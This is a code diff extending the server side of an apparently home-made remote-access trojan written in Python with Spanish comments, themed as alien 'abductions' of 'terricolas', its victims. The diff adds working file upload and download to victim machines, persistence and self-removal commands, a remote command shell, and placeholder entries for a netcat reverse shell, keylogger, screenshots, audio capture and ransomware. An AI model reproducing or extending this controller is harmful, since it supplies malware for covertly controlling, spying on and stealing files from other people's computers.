@@ -5,7 +5,6 @@ import os
 import sys
 import time
 import socket
-import ctypes
 import pygame	
 
 from tabulate import tabulate
@@ -95,11 +94,16 @@ class Server(Thread):
 		self.ip = "0.0.0.0"
 		self.port = int(port)
 
-		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		try:
 
-		self.server.bind((self.ip,self.port))
-		self.server.listen(5)
+			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+			self.server.bind((self.ip,self.port))
+			self.server.listen(5)
+
+		except socket.error as e:
+			print (" Error: ",e)
 
 
 	# --------- ENVIAR MENSAJES ---------
@@ -157,7 +161,7 @@ class Server(Thread):
 
 
 	def VerAbducciones(self):
-		os.system('xterm -title "Abduccion en vivo" -e python3 abducciones/pantalla.py &')
+		os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Abduccion en vivo" -e python3 abducciones/pantalla.py &')
 		return
 
 
@@ -245,13 +249,15 @@ class Server(Thread):
 
 
 
-class ModosAtaque():
+# -----------------------------------------------------------------------------------------
+
+class Control():
 
 	def run_cmd(servidor,client):
 		
 		COMANDOS = {
 
-		"detener" : ["stop","Detiene temporalmente a la victima"]
+		"{detener|exit}" : ["stop","Detiene temporalmente a la victima"]
 
 		}
 
@@ -266,7 +272,7 @@ class ModosAtaque():
 					location = servidor.recibir(servidor.terricolas[client][0])
 					print(location)
 
-				elif (sesion=="detener"):
+				elif (sesion=="detener") or (sesion=="exit"):
 					servidor.enviar(servidor.terricolas[client][0],sesion)
 					t = servidor.recibir(servidor.terricolas[client][0])
 					print(t)
@@ -277,21 +283,119 @@ class ModosAtaque():
 
 				else:
 					servidor.enviar(servidor.terricolas[client][0],sesion)
+					longitud = int(servidor.recibir(servidor.terricolas[client][0]))
 
-					data = "\n"
+					data = []
 
 					while(True):
 						datos = servidor.recibir(servidor.terricolas[client][0])
-						data += datos
-
-						if(datos.endswith("\n Comando utilizado: " + sesion)): 
+						data.append(datos)
+						if (len(data)==longitud):
 							break
+	
+					for _ in data:
+						print(_.rstrip('\n'))
 
-					print(data + "\n")
 
 			sesion = input(" (\033[0;31m" + servidor.terricolas[client][2] + "\033[0;39m)> ")
 
+		return
 
+
+	def subir_archivos(servidor,client,origen,destino):
+
+		# Envia modo de uso y recibe el 'ok'
+		servidor.enviar(servidor.terricolas[client][0],"subir")
+		servidor.recibir(servidor.terricolas[client][0])
+
+		# Envia el destino donde se va a guardar el archivo
+		servidor.enviar(servidor.terricolas[client][0],destino)
+		servidor.recibir(servidor.terricolas[client][0])
+		time.sleep(0.1)
+
+		servidor.enviar(servidor.terricolas[client][0],str(os.path.getsize(origen)))
+		servidor.recibir(servidor.terricolas[client][0])
+		time.sleep(1)
+
+
+		# Se prepara para el envio de datos del archivo
+		with open(origen, "rb") as archivo_origen:
+				contenido = archivo_origen.read(1024)
+				while contenido:
+					servidor.terricolas[client][0].sendall(contenido)
+					contenido = archivo_origen.read(1024)
+
+		print(" El archivo se subio correctamente.")    
+
+		return
+
+
+	def descargar_archivos(servidor,client,origen,destino):
+
+		# Envia modo de uso y recibe el 'ok'
+		servidor.enviar(servidor.terricolas[client][0],"descargar")
+		servidor.recibir(servidor.terricolas[client][0])
+
+
+		# Envia ruta a descargar
+		servidor.enviar(servidor.terricolas[client][0],origen)
+		time.sleep(0.1)
+
+		size = int(servidor.recibir(servidor.terricolas[client][0]))
+		servidor.enviar(servidor.terricolas[client][0],"ok")
+
+		#print(size)
+
+		# Abre el archivo nuevo 
+		with open(destino, "wb") as archivo_destino:
+			#contenido = self.client.recv(1024)
+			#print(os.path.getsize(destino))
+			while (size>0):
+				contenido = servidor.terricolas[client][0].recv(1024)
+				archivo_destino.write(contenido)
+				size-=len(contenido)
+				#print(size)
+
+		print(" El archivo se descargo correctamente.")   
+
+		return
+
+
+	def netcat(servidor,client):
+		#servidor.enviar(servidor.terricolas[client][0],"netcat")
+		#os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Victima Netcat" -e nc -lp 9001 &')
+		return (" Modulo en desarrollo")
+
+	def persistencia(servidor,client):
+
+		servidor.enviar(servidor.terricolas[client][0],"persistencia")
+		msg = servidor.recibir(servidor.terricolas[client][0])
+		print (msg)
+		return
+
+
+	def autoremoverse(servidor,client):
+
+		servidor.enviar(servidor.terricolas[client][0],"autoremover")
+		msg = servidor.recibir(servidor.terricolas[client][0])
+		print (msg)
+		return
+
+
+	def keylogger(servidor,client):
+		return
+
+
+	def screenshot(servidor,client):
+		return
+
+
+	def grabarAudio(servidor,client):
+		return
+
+
+	def ransomware(servidor,client):
+		return
 
 
 
@@ -302,6 +406,11 @@ def manipular(servidor,cliente):
 	COMANDOS = {
 
 	"cmd" : ["shell","Ejecutar shell"],
+	"netcat" : ["netcat","Utiliza netcat para obtener un shell inversa"],
+	"subir" : ["upload","Subir archivo a equipo remoto"],
+	"descargar" : ["download","Descargar archivo de equipo remoto"],
+	"persistencia" : ["persistence","Implantar bicho en el cerebro victima"],
+	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"],
 	"ayuda": ["Help","Despliega esto"],
 	"limpiar": ["Clear","Limpiar pantalla"],
 	"volver": ["Back","Regresa al menu principal"]
@@ -314,8 +423,28 @@ def manipular(servidor,cliente):
 	while (victima!="volver"):
 
 		if (victima=="cmd"):
-			ModosAtaque.run_cmd(servidor,cliente)
+			Control.run_cmd(servidor,cliente)
 			encabezados('manipular')
+
+		elif (victima=="subir"):
+			origen = input(' Ruta archivo atacante: ')
+			destino = input(' Ruta archivo victima: ')
+			Control.subir_archivos(servidor,cliente,origen,destino)
+
+		elif (victima=="descargar"):
+			origen = input(' Ruta archivo victima: ')
+			destino = input(' Ruta archivo atacante: ')
+			Control.descargar_archivos(servidor,cliente,origen,destino)
+
+		elif (victima=="netcat"):
+			os.system('clear')
+			banner_manipular()
+			Control.netcat(servidor,cliente)
+			encabezados('manipular')
+
+		elif (victima=="persistencia"):
+			Control.persistencia(servidor,cliente)
+			#encabezados('manipular')
 
 		elif (victima=="ayuda"):
 			desplegar_ayuda(COMANDOS)
@@ -368,7 +497,8 @@ def laboratorio(servidor):
 				else:
 					print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
 
-			except ValueError:
+			except ValueError as e:
+				print(e)
 				print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");
 
 		elif ('matar' in prompt_laboratorio):
@@ -497,7 +627,7 @@ def menu():
 
 	opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")
 
-	while(opcion!="volver"):
+	while(opcion!="salir"):
 
 		if(opcion=="abducir"):
 			abducciones_menu(servidor)
